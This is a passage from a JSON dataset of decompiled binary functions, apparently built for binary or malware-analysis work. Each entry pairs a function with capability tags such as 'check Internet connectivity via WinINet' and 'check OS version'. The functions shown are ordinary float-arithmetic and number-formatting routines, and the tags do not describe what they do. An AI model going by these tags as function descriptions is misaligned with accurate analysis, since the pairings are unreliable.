        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00440f6a)\n\nvoid fcn.00440d00(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5, int32_t param_6)\n\n{\n    bool bVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    ushort *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint uStack34;\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    ushort uStack18;\n    \n    uStack18 = 0;\n    uStack34 = 0;\n    uStack30 = 0;\n    uStack26 = 0;\n    uStack22 = 0x10000;\n    iVar4 = fcn.00440b50(param_1);\n    param_4 = param_4 - iVar4;\n    if ((0x50 < iVar4) && (param_4 < 0x7fff)) {\ncode_r0x00440d9e:\n        *(param_1 + 2) = 0;\n        *(param_1 + 6) = 0;\n        *(param_1 + 10) = 0;\n        *(param_1 + 0xe) = 0;\n        return;\n    }\n    uVar10 = param_2;\n    if (param_4 < 0) {\n        if (param_4 < -0x50) goto code_r0x00440d9e;\n        iVar4 = fcn.00440260();\n        uVar10 = 1;\n        if (iVar4 == 0) {\n            uVar10 = param_2;\n        }\n    }\n    param_2 = uVar10;\n    if (param_5 == 0) goto code_r0x00440d63;\n    if (param_6 == 0x40) {\n        uStack22 = 1;\n        iStack60 = 0xe;\n        iStack52 = 6;\n        iStack56 = 7;\n    }\n    else {\n        iStack60 = 0x10;\n        iStack52 = 7;\n        iStack56 = 8;\n    }\n    bVar1 = param_4 < 1 && param_6 != 0x50;\n    if (bVar1) {\n        param_2 = param_2 | *(param_1 + 0x10) & 1;\n        puVar7 = param_1 + 4;\n        do {\n            puVar8 = puVar7 + 1;\n            *puVar7 = *puVar7 >> 1;\n            puVar7 = puVar8;\n        } while (param_1 + 0x12 != puVar8);\n    }\n    uVar2 = *(iStack60 + param_1);\n    if ((param_6 < 0x50) && (iStack56 == 7)) {\n        if (*(param_1 + 0x10) != 0) {\n            uVar2 = uVar2 | 1;\n        }\n        *(param_1 + 0x10) = 0;\n    }\n    *(iStack60 + param_1) = 0;\n    if (-1 < uVar2) goto code_r0x00440e51;\n    if (uVar2 == 0x8000) {\n        if (param_2 == 0) {\n            if ((*(param_1 + iStack52 * 2) & 1) != 0) goto code_r0x00440f00;\n        }\n        else if (param_3 == 0) goto code_r0x00440f00;\n    }\n    else {\ncode_r0x00440f00:\n        iVar4 = 7;\n        uVar10 = 0;\n        uVar9 = 0;\n        while( true ) {\n            uVar9 = uVar10 + *(param_1 + 2 + iVar4 * 2) + uVar9;\n            *(param_1 + 2 + iVar4 * 2) = uVar9;\n            uVar9 = uVar9 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n            if (iVar4 == 0) break;\n            uVar10 = *(&uStack34 + iVar4 * 2 + 2);\n        }\n    }\ncode_r0x00440e51:\n    if (bVar1) {\n        uVar10 = 0;\n        puVar7 = param_1 + 0x10;\n        do {\n            if (*puVar7 < 0) {\n                uVar10 = uVar10 | 1;\n            }\n            uVar2 = *puVar7 * 2;\n            if ((uVar10 & 2) != 0) {\n                uVar2 = uVar2 | 1;\n            }\n            puVar8 = puVar7 + -1;\n            uVar10 = uVar10 * 2;\n            *puVar7 = uVar2;\n            puVar7 = puVar8;\n        } while (param_1 + 2 != puVar8);\n    }\n    uVar2 = *(param_1 + 4);\n    if (uVar2 != 0) {\n        uVar10 = 0;\n        puVar7 = param_1 + 4;\n        while( true ) {\n            if ((uVar2 & 1) != 0) {\n                uVar10 = uVar10 | 1;\n            }\n            uVar3 = uVar2 >> 1;\n            if ((uVar10 & 2) != 0) {\n                uVar3 = uVar2 >> 1 | 0x8000;\n            }\n            puVar8 = puVar7 + 1;\n            uVar10 = uVar10 * 2;\n            *puVar7 = uVar3;\n            if (param_1 + 0x12 == puVar8) break;\n            uVar2 = *puVar8;\n            puVar7 = puVar8;\n        }\n        param_4 = param_4 + 1;\n    }\ncode_r0x00440d63:\n    *(param_1 + 0x10) = 0;\n    if (0x7ffe < param_4) {\n        *(param_1 + 2) = 0x7fff;\n        puVar5 = param_1 + 4;\n        do {\n            puVar6 = puVar5 + 1;\n            *puVar5 = 0;\n            puVar5 = puVar6;\n        } while (param_1 + 0x10 != puVar6);\n        return;\n    }\n    if (param_4 < 0) {\n        param_4 = 0;\n    }\n    *(param_1 + 2) = param_4;\n    return;\n}\n",
        "token_count": 1568
    },
    "00441000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00441000(int16_t *param_1, uint *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    \n    uVar1 = param_1[1] | 0x8000;\n    if (*param_1 == 0) {\n        uVar1 = param_1[1];\n    }\n    *(param_2 + 10) = uVar1;\n    piVar3 = param_1 + 3;\n    if (param_1[1] != 0x7fff) {\n        puVar4 = param_2 + 2;\n        do {\n            piVar2 = piVar3 + 1;\n            *puVar4 = *piVar3;\n            piVar3 = piVar2;\n            puVar4 = puVar4 + -2;\n        } while (piVar2 != param_1 + 8);\n        return;\n    }\n    do {\n        if (*piVar3 != 0) {\n            *param_2 = 0;\n            param_2[1] = 0;\n            param_2[2] = 0x7fffc000;\n            return;\n        }\n        piVar3 = piVar3 + 1;\n    } while (param_1 + 9 != piVar3);\n    *(param_2 + 10) = *(param_2 + 10) | 0x7fff;\n    *param_2 = 0;\n    param_2[1] = 0;\n    *(param_2 + 2) = 0;\n    return;\n}\n",
        "token_count": 365
    },
    "00441090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00441090(uint *param_1, uint *param_2, uint *param_3)\n\n{\n    int16_t iVar1;\n    ushort uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int16_t iStack52;\n    uint16_t uStack50;\n    int16_t aiStack48 [6];\n    int16_t iStack36;\n    int16_t iStack34;\n    uint16_t uStack32;\n    int16_t aiStack30 [6];\n    int16_t iStack18;\n    \n    uVar8 = *(param_1 + 10) & 0x7fff;\n    if (uVar8 == 0x7fff) {\n        puVar7 = param_1;\n        do {\n            puVar12 = puVar7 + 2;\n            if (*puVar7 != 0) {\n                *param_3 = *param_1;\n                param_3[1] = param_1[1];\n                param_3[2] = param_1[2];\n                return;\n            }\n            puVar7 = puVar12;\n        } while (puVar12 != param_1 + 10);\n    }\n    uVar9 = *(param_2 + 10) & 0x7fff;\n    puVar7 = param_1;\n    if (uVar9 == 0x7fff) {\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) {\n                *param_3 = *param_2;\n                param_3[1] = param_2[1];\n                param_3[2] = param_2[2];\n                return;\n            }\n            puVar12 = puVar11;\n        } while (puVar11 != param_2 + 10);\n        if (uVar8 == 0x7fff) goto code_r0x004410de;\ncode_r0x004411f2:\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x004412e2;\n            puVar12 = puVar11;\n        } while (puVar11 != param_2 + 10);\n        if (*(param_1 + 2) == 0) {\n            puVar12 = param_1 + 1;\n            do {\n                if (*puVar12 != 0) goto code_r0x004412e2;\n                puVar12 = puVar12 + 2;\n            } while (puVar12 != param_1 + 4);\ncode_r0x0044111d:\n            *param_3 = 0;\n            param_3[1] = 0;\n            param_3[2] = 0x7fffc000;\n            return;\n        }\ncode_r0x004412e2:\n        if (uVar8 == 0x7fff) goto code_r0x0044136d;\ncode_r0x004412ed:\n        puVar12 = param_2;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x00441140;\n            puVar12 = puVar11;\n        } while (param_2 + 10 != puVar11);\n        if (uVar8 != 0x7fff) goto code_r0x0044130c;\n    }\n    else {\n        if (uVar8 != 0x7fff) {\ncode_r0x00441140:\n            fcn.00440430(param_1, &iStack52);\n            fcn.00440430(param_2, &iStack34);\n            uVar10 = uStack50;\n            uVar6 = uStack32;\n            if (uStack50 == 0) {\n                piVar3 = aiStack48;\n                do {\n                    if (piVar3 == &iStack36) goto code_r0x00441233;\n                    iVar1 = *piVar3;\n                    piVar3 = piVar3 + 1;\n                } while (iVar1 == 0);\n                iVar4 = fcn.00440b50(&iStack52);\n                uVar10 = -iVar4;\n            }\n            piVar3 = aiStack30;\n            if (uStack32 == 0) {\n                do {\n                    if (&iStack18 == piVar3) {\ncode_r0x00441233:\n                        *param_3 = 0;\n                        param_3[1] = 0;\n                        param_3[2] = 0;\n                        return;\n                    }\n                    iVar1 = *piVar3;\n                    piVar3 = piVar3 + 1;\n                } while (iVar1 == 0);\n                iVar4 = fcn.00440b50(&iStack34);\n                uVar6 = uVar6 - iVar4;\n            }\n            uVar5 = fcn.004407d0(&iStack52, &iStack34);\n            fcn.00440d00(&iStack34, uVar5, 0, (uVar10 - 0x3ffe) + uVar6, 0x40, 0x50);\n            iStack34 = (iStack52 == iStack34) - 1;\n            fcn.00441000(&iStack34, param_3);\n            return;\n        }\ncode_r0x004410de:\n        puVar12 = param_1;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) goto code_r0x00441360;\n            puVar12 = puVar11;\n        } while (puVar11 != param_1 + 10);\n        if (*(param_2 + 2) == 0) {\n            puVar12 = param_2 + 1;\n            do {\n                if (*puVar12 != 0) goto code_r0x00441360;\n                puVar12 = puVar12 + 2;\n            } while (puVar12 != param_2 + 4);\n            goto code_r0x0044111d;\n        }\ncode_r0x00441360:\n        if (uVar9 == 0x7fff) goto code_r0x004411f2;\ncode_r0x0044136d:\n        puVar12 = param_1;\n        do {\n            puVar11 = puVar12 + 2;\n            if (*puVar12 != 0) {\n                if (uVar9 != 0x7fff) goto code_r0x00441140;\n                goto code_r0x004412ed;\n            }\n            puVar12 = puVar11;\n        } while (param_1 + 10 != puVar11);\n    }\n    do {\n        puVar12 = puVar7 + 2;\n        if (*puVar7 != 0) {\n            uVar10 = 0;\n            goto code_r0x0044130f;\n        }\n        puVar7 = puVar12;\n    } while (puVar12 != param_1 + 10);\ncode_r0x0044130c:\n    uVar10 = *(param_1 + 10) >> 0x1f;\ncode_r0x0044130f:\n    if (uVar9 == 0x7fff) {\n        puVar7 = param_2;\n        do {\n            puVar12 = puVar7 + 2;\n            if (*puVar7 != 0) {\n                uVar6 = 0;\n                goto code_r0x00441324;\n            }\n            puVar7 = puVar12;\n        } while (puVar12 != param_2 + 10);\n    }\n    uVar6 = *(param_2 + 10) >> 0x1f;\ncode_r0x00441324:\n    uVar2 = 0;\n    if (uVar6 != uVar10) {\n        uVar2 = 0x8000;\n    }\n    *param_3 = 0;\n    param_3[1] = 0;\n    *(param_3 + 10) = uVar2;\n    *(param_3 + 10) = *(param_3 + 10) | 0x7fff;\n    *(param_3 + 2) = 0;\n    return;\n}\n",
        "token_count": 1891
    },
    "00441960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441960(uint32_t param_1, char *param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(param_3 + 8);\n    if (param_1 < 1) {\n        if (iVar2 < 1) {\n            if (-1 < iVar2) goto code_r0x00441989;\n            *(param_3 + 8) = 0xffffffff;\n            goto joined_r0x00441aeb;\n        }\n        iVar2 = iVar2 + -1;\n        *(param_3 + 8) = iVar2;\ncode_r0x00441989:\n        iVar1 = *(param_3 + 0xc);\n        if (iVar2 <= iVar1) {\n            *(param_3 + 8) = 0xffffffff;\n            if (0 < param_1) goto code_r0x00441a47;\n            goto joined_r0x00441aeb;\n        }\n        iVar2 = iVar2 - iVar1;\n        *(param_3 + 8) = iVar2;\n        if ((iVar1 < 1) && ((*(param_3 + 4) & 0x800) == 0)) {\n            if ((0 < param_1) && (((*(param_3 + 4) & 0x1000) != 0 && (*(param_3 + 0x1c) != 0)))) {\ncode_r0x00441a61:\n                uVar3 = (param_1 + 2) / 3;\n                if (1 < uVar3) {\n                    if (0 < iVar2) {\n                        iVar1 = iVar2 - uVar3;\n                        do {\n                            iVar2 = iVar2 + -1;\n                            if (iVar1 + 1 == iVar2) {\n                                *(param_3 + 8) = iVar2;\n                                goto code_r0x00441a95;\n                            }\n                        } while (iVar2 != 0);\n                        *(param_3 + 8) = 0;\n                    }\n                    goto joined_r0x00441aeb;\n                }\n                goto code_r0x00441a95;\n            }\n        }\n        else {\n            iVar2 = iVar2 + -1;\n            *(param_3 + 8) = iVar2;\n            if ((0 < param_1) && (((*(param_3 + 5) & 0x10) != 0 && (*(param_3 + 0x1c) != 0)))) goto code_r0x00441a61;\ncode_r0x00441a95:\n            if (iVar2 < 1) goto joined_r0x00441aeb;\n        }\n        if (in_EAX == 0) {\n            uVar3 = *(param_3 + 4);\n            if ((uVar3 & 0x1c0) == 0) {\n                if (((uVar3 & 0x600) == 0) && (iVar2 = *(param_3 + 8),  *(param_3 + 8) = iVar2 + -1,  0 < iVar2))\n                goto code_r0x00441ad0;\n            }\n            else {\n                *(param_3 + 8) = iVar2 + -1;\n                if (iVar2 + -1 != 0) goto code_r0x00441ac1;\n            }\n            goto code_r0x004419ae;\n        }\n        *(param_3 + 8) = iVar2 + -1;\n        if (iVar2 + -1 != 0) {\n            uVar3 = *(param_3 + 4);\ncode_r0x00441ac1:\n            if ((uVar3 & 0x600) == 0) {\n                *(param_3 + 8) = iVar2 + -2;\ncode_r0x00441ad0:\n                do {\n                    fcn.00441540();\n                    iVar2 = *(param_3 + 8);\n                    *(param_3 + 8) = iVar2 + -1;\n                } while (0 < iVar2);\n            }\n            goto joined_r0x00441aeb;\n        }\ncode_r0x00441af1:\n        fcn.00441540();\n    }\n    else {\n        if (param_1 <= iVar2) {\n            iVar2 = iVar2 - param_1;\n            *(param_3 + 8) = iVar2;\n            goto code_r0x00441989;\n        }\n        *(param_3 + 8) = 0xffffffff;\ncode_r0x00441a47:\n        if (((*(param_3 + 5) & 0x10) != 0) && (iVar2 = -1,  *(param_3 + 0x1c) != 0)) goto code_r0x00441a61;\njoined_r0x00441aeb:\n        if (in_EAX != 0) goto code_r0x00441af1;\n        uVar3 = *(param_3 + 4);\ncode_r0x004419ae:\n        if ((uVar3 & 0x100) == 0) {\n            if ((uVar3 & 0x40) != 0) {\n                fcn.00441540();\n            }\n        }\n        else {\n            fcn.00441540();\n        }\n    }\n    if ((0 < *(param_3 + 8)) && ((*(param_3 + 4) & 0x600) == 0x200)) {\n        *(param_3 + 8) = *(param_3 + 8) + -1;\n        do {\n            fcn.00441540();\n            iVar2 = *(param_3 + 8);\n            *(param_3 + 8) = iVar2 + -1;\n        } while (0 < iVar2);\n    }\n    if (param_1 < 1) {\n        fcn.00441540();\n        iVar2 = *(param_3 + 0xc);\n        if ((iVar2 < 1) && ((*(param_3 + 5) & 8) == 0)) {\n            if (param_1 == 0) goto code_r0x00441b1f;\n        }\n        else {\n            fcn.00441880();\n            if (param_1 == 0) goto code_r0x00441b7a;\n            iVar2 = *(param_3 + 0xc);\n        }\n        *(param_3 + 0xc) = iVar2 + param_1;\n        do {\n            fcn.00441540();\n            param_1 = param_1 + 1;\n        } while (param_1 != 0);\n        iVar2 = *(param_3 + 0xc);\n        *(param_3 + 0xc) = iVar2 + -1;\n        if (0 < iVar2) goto code_r0x00441b61;\n    }\n    else {\n        while( true ) {\n            if (*param_2 != '\\0') {\n                param_2 = param_2 + 1;\n            }\n            fcn.00441540();\n            param_1 = param_1 - 1;\n            if (param_1 == 0) break;\n            if ((((*(param_3 + 5) & 0x10) != 0) && (*(param_3 + 0x1c) != 0)) && (param_1 == (param_1 / 3) * 3)) {\n                fcn.004415a0();\n            }\n        }\n        iVar2 = *(param_3 + 0xc);\n        if ((0 < iVar2) || ((*(param_3 + 5) & 8) != 0)) {\n            fcn.00441880();\ncode_r0x00441b7a:\n            while (iVar2 = *(param_3 + 0xc),  *(param_3 + 0xc) = iVar2 + -1,  0 < iVar2) {\ncode_r0x00441b61:\n                if (*param_2 != '\\0') {\n                    param_2 = param_2 + 1;\n                }\n                fcn.00441540();\n            }\n            return;\n        }\ncode_r0x00441b1f:\n        *(param_3 + 0xc) = iVar2 + -1;\n    }\n    return;\n}\n",
        "token_count": 1841
    },
    "00441da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00441da0(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    int64_t iVar10;\n    int32_t aiStack80 [5];\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t uStack44;\n    char *pcStack40;\n    char *var_20h;\n    uint32_t uStack32;\n    uint var_ch;\n    \n    var_34h = *(param_1 + 0xc);\n    uStack44 = *(param_1 + 4);\n    var_38h = *(param_1 + 8);\n    aiStack80[0] = 0x441df2;\n    var_20h = in_EAX;\n    uStack32 = param_2;\n    iVar2 = fcn.00437ed0();\n    iVar2 = -iVar2;\n    pcStack40 = &fcn.00441da0::var_2ch + iVar2 + 3 & 0xfffffff0;\n    if ((uStack44 & 0x80) != 0) {\n        if (uStack32 < 0) {\n            bVar9 = var_20h != NULL;\n            var_20h = -var_20h;\n            uStack32 = -(uStack32 + bVar9);\n        }\n        else {\n            uStack44 = uStack44 & 0xffffff7f;\n            *(param_1 + 4) = uStack44;\n        }\n    }\n    iVar10 = CONCAT44(uStack32, var_20h);\n    var_2ch = uStack44 & 0x1000;\n    pcVar4 = pcStack40;\n    if ((uStack32 | var_20h) != 0) {\n        var_30h = param_1;\n        var_20h = pcStack40;\n        while( true ) {\n            pcVar5 = var_20h;\n            uVar7 = iVar10 >> 0x20;\n            *(&stack0xffffffb4 + iVar2) = iVar10;\n            *(&stack0xffffffb8 + iVar2) = uVar7;\n            *(&stack0xffffffbc + iVar2) = 10;\n            *(&stack0xffffffc0 + iVar2) = 0;\n            var_20h = pcVar5 + 1;\n            *(&stack0xffffffb0 + iVar2) = 0x441e67;\n            cVar1 = fcn.00438000();\n            *pcVar5 = cVar1 + '0';\n            *(&stack0xffffffb4 + iVar2) = iVar10;\n            *(&stack0xffffffb8 + iVar2) = uVar7;\n            *(&stack0xffffffbc + iVar2) = 10;\n            *(&stack0xffffffc0 + iVar2) = 0;\n            *(&stack0xffffffb0 + iVar2) = 0x441e88;\n            iVar10 = fcn.00437f00();\n            pcVar4 = var_20h;\n            param_1 = var_30h;\n            if (iVar10 == 0) break;\n            if ((((pcStack40 != var_20h) && (var_2ch != 0)) && (*(var_30h + 0x1c) != 0)) &&\n               (uVar6 = (var_20h - pcStack40 >> 0x1f) >> 0x1e,  ((var_20h - pcStack40) + uVar6 & 3) - uVar6 == 3)) {\n                pcVar5[1] = ',';\n                var_20h = pcVar5 + 2;\n            }\n        }\n    }\n    if ((0 < var_34h) && (iVar8 = var_34h - (pcVar4 - pcStack40),  0 < iVar8)) {\n        pcVar3 = pcVar4 + iVar8;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5 + 1;\n            *pcVar5 = '0';\n            pcVar5 = pcVar4;\n        } while (pcVar4 != pcVar3);\n    }\n    if ((pcStack40 == pcVar4) && (var_34h != 0)) {\n        *pcVar4 = '0';\n        pcVar4 = pcVar4 + 1;\n    }\n    if (0 < var_38h) {\n        iVar8 = var_38h - (pcVar4 - pcStack40);\n        *(param_1 + 8) = iVar8;\n        if (0 < iVar8) {\n            if ((uStack44 & 0x1c0) != 0) {\n                *(param_1 + 8) = iVar8 + -1;\n            }\n            if ((var_34h < 0) && ((uStack44 & 0x600) == 0x200)) {\n                iVar8 = *(param_1 + 8);\n                *(param_1 + 8) = iVar8 + -1;\n                if (0 < iVar8) {\n                    pcVar3 = pcVar4 + iVar8;\n                    pcVar5 = pcVar4;\n                    do {\n                        pcVar4 = pcVar5 + 1;\n                        *pcVar5 = '0';\n                        pcVar5 = pcVar4;\n                    } while (pcVar4 != pcVar3);\n                    *(param_1 + 8) = 0xffffffff;\n                }\n            }\n            else if (((uStack44 & 0x400) == 0) && (iVar8 = *(param_1 + 8),  *(param_1 + 8) = iVar8 + -1,  0 < iVar8)) {\n                do {\n                    *(&stack0xffffffb0 + iVar2) = 0x44200c;\n                    fcn.00441540();\n                    iVar8 = *(param_1 + 8);\n                    *(param_1 + 8) = iVar8 + -1;\n                } while (0 < iVar8);\n                uStack44 = *(param_1 + 4);\n            }\n        }\n    }\n    pcVar5 = pcStack40;\n    if ((uStack44 & 0x80) == 0) {\n        if ((uStack44 & 0x100) == 0) {\n            pcVar3 = pcVar4;\n            if ((uStack44 & 0x40) != 0) {\n                pcVar3 = pcVar4 + 1;\n                *pcVar4 = ' ';\n            }\n        }\n        else {\n            *pcVar4 = '+';\n            pcVar3 = pcVar4 + 1;\n        }\n    }\n    else {\n        *pcVar4 = '-';\n        pcVar3 = pcVar4 + 1;\n    }\n    if (pcVar3 <= pcStack40) goto code_r0x00441f8e;\n    do {\n        pcVar3 = pcVar3 + -1;\n        *(&stack0xffffffb0 + iVar2) = 0x441f71;\n        fcn.00441540();\n    } while (pcVar5 != pcVar3);\n    iVar8 = *(param_1 + 8);\n    *(param_1 + 8) = iVar8 + -1;\n    while (0 < iVar8) {\n        *(&stack0xffffffb0 + iVar2) = 0x441f8e;\n        fcn.00441540();\ncode_r0x00441f8e:\n        iVar8 = *(param_1 + 8);\n        *(param_1 + 8) = iVar8 + -1;\n    }\n    return;\n}\n",
        "token_count": 1781
    },
    "004423c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004423c0(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint32_t uStack64;\n    uint32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint8_t *var_28h;\n    uint8_t var_21h;\n    uint8_t *var_20h;\n    uint8_t *var_1ch;\n    uint var_ch;\n    \n    var_1ch = (in_EAX != 0x6f) + 3;\n    var_30h = *(arg_8h + 0xc);\n    var_38h = *(arg_8h + 4);\n    var_34h = *(arg_8h + 8);\n    uStack64 = 0x442438;\n    var_2ch = in_EAX;\n    iVar4 = fcn.00437ed0();\n    iVar4 = -iVar4;\n    var_28h = &fcn.004423c0::var_2ch + iVar4 + 3 & 0xfffffff0;\n    uVar1 = (var_2ch != 0x6f) * '\\b' + 7;\n    puVar8 = var_28h;\n    if ((in_ECX | in_EDX) == 0) {\ncode_r0x00442644:\n        *(arg_8h + 4) = var_38h & 0xfffff7ff;\n    }\n    else {\n        var_20h = var_20h & 0xffffff00 | uVar1;\n        var_21h = var_2ch & 0x20;\n        puVar11 = var_28h;\n        do {\n            puVar8 = puVar11 + 1;\n            uVar3 = uVar1 & in_EDX;\n            uVar7 = uVar3 + 0x30;\n            uVar3 = uVar3 + 0x37 | var_2ch & 0x20;\n            if (uVar7 < 0x3a) {\n                uVar3 = uVar7;\n            }\n            *puVar11 = uVar3;\n            uVar6 = in_ECX << 0x20 - (var_1ch & 0x1f);\n            uVar9 = in_ECX >> (var_1ch & 0x1f);\n            in_ECX = uVar9;\n            in_EDX = in_EDX >> (var_1ch & 0x1f) | uVar6;\n            if ((var_1ch & 0x20) != 0) {\n                in_ECX = 0;\n                in_EDX = uVar9;\n            }\n            puVar11 = puVar8;\n        } while ((in_ECX | in_EDX) != 0);\n        if (var_28h == puVar8) goto code_r0x00442644;\n    }\n    if ((var_30h < 1) || (iVar10 = var_30h - (puVar8 - var_28h),  iVar10 < 1)) {\n        if ((var_2ch == 0x6f) && ((*(arg_8h + 5) & 8) != 0)) {\n            *puVar8 = 0x30;\n            puVar8 = puVar8 + 1;\n        }\n    }\n    else {\n        puVar5 = puVar8 + iVar10;\n        puVar11 = puVar8;\n        do {\n            puVar8 = puVar11 + 1;\n            *puVar11 = 0x30;\n            puVar11 = puVar8;\n        } while (puVar8 != puVar5);\n    }\n    if ((var_30h != 0) && (var_28h == puVar8)) {\n        *puVar8 = 0x30;\n        puVar8 = puVar8 + 1;\n    }\n    if (puVar8 - var_28h < var_34h) {\n        puVar11 = var_34h - (puVar8 - var_28h);\n        *(arg_8h + 8) = puVar11;\n        uVar6 = *(arg_8h + 4);\n        if (var_2ch == 0x6f) {\n            if ((var_30h < 0) && ((uVar6 & 0x600) == 0x200)) {\ncode_r0x00442700:\n                puVar11 = puVar11 + puVar8;\n                puVar5 = puVar8;\n                do {\n                    puVar8 = puVar5 + 1;\n                    *puVar5 = 0x30;\n                    puVar5 = puVar8;\n                } while (puVar8 != puVar11);\n                puVar11 = 0xffffffff;\n                if (var_2ch != 0x6f) goto joined_r0x0044271b;\n                goto code_r0x004426d4;\n            }\n            puVar5 = puVar11 + -1;\n            if ((uVar6 & 0x400) == 0) {\n                var_1ch = puVar8;\n                goto code_r0x00442663;\n            }\n        }\n        else {\n            if ((uVar6 & 0x800) == 0) {\n                if (var_30h < 0) goto code_r0x004426e4;\ncode_r0x004426aa:\n                var_1ch = puVar8;\n            }\n            else {\n                puVar11 = puVar11 + -2;\n                if ((0 < puVar11) && (var_30h < 0)) {\ncode_r0x004426e4:\n                    if ((uVar6 & 0x600) == 0x200) goto code_r0x00442700;\n                    if ((uVar6 & 0x800) == 0) goto code_r0x004426aa;\n                }\ncode_r0x004425c1:\n                puVar8[1] = 0x30;\n                *puVar8 = var_2ch;\n                puVar8 = puVar8 + 2;\n                var_1ch = puVar8;\n                if (puVar11 < 1) goto code_r0x004426d4;\n            }\n            puVar5 = puVar11 + -1;\n            puVar8 = var_1ch;\n            if ((uVar6 & 0x400) == 0) {\ncode_r0x00442663:\n                do {\n                    *(&stack0xffffffc0 + iVar4) = 0x442672;\n                    fcn.00441540();\n                    bVar2 = 0 < puVar5;\n                    puVar5 = puVar5 + -1;\n                } while (bVar2);\n                if (var_1ch <= var_28h) {\n                    return;\n                }\n                var_20h = 0xfffffffe;\n                puVar11 = 0xffffffff;\n                puVar8 = var_1ch;\n                goto code_r0x00442691;\n            }\n        }\n        if (puVar8 <= var_28h) goto code_r0x00442550;\ncode_r0x0044251c:\n        var_1ch = puVar11;\n        var_20h = puVar5;\n        puVar11 = var_28h;\n    }\n    else {\n        *(arg_8h + 8) = 0xffffffff;\n        if (var_2ch == 0x6f) {\n            puVar5 = 0xfffffffe;\n            puVar11 = 0xffffffff;\n            if (puVar8 <= var_28h) {\n                return;\n            }\n            goto code_r0x0044251c;\n        }\n        uVar6 = *(arg_8h + 4);\njoined_r0x0044271b:\n        puVar11 = 0xffffffff;\n        if ((uVar6 & 0x800) != 0) goto code_r0x004425c1;\ncode_r0x004426d4:\n        if (puVar8 <= var_28h) {\n            return;\n        }\n        var_20h = puVar11 + -1;\ncode_r0x00442691:\n        var_1ch = puVar11;\n        puVar11 = var_28h;\n    }\n    do {\n        puVar8 = puVar8 + -1;\n        *(&stack0xffffffc0 + iVar4) = 0x44253d;\n        fcn.00441540();\n    } while (puVar11 < puVar8);\n    puVar5 = var_20h;\n    if (var_1ch < 1) {\n        return;\n    }\ncode_r0x00442550:\n    do {\n        *(&stack0xffffffc0 + iVar4) = 0x44255f;\n        fcn.00441540();\n        bVar2 = 0 < puVar5;\n        puVar5 = puVar5 + -1;\n    } while (bVar2);\n    return;\n}\n",
        "token_count": 2142
    },
    "00442d30": {
